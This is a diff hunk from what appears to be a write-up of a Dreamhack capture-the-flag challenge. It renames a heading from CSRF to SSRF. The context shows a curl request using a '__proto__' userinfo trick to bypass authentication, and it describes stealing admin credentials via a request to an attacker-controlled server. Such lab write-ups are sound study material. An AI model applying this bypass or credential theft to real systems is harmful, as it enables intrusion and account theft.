@@ -131,7 +131,7 @@ curl http://__proto__:%5Bobject%20Object%5D@host1.dreamhack.games:16001/report
 
 ```
 
-### CSRF
+### SSRF
 With the authentication bypassed, we can steal the admin credentials by sending a request to a server controlled by us 
 
 ``` bash
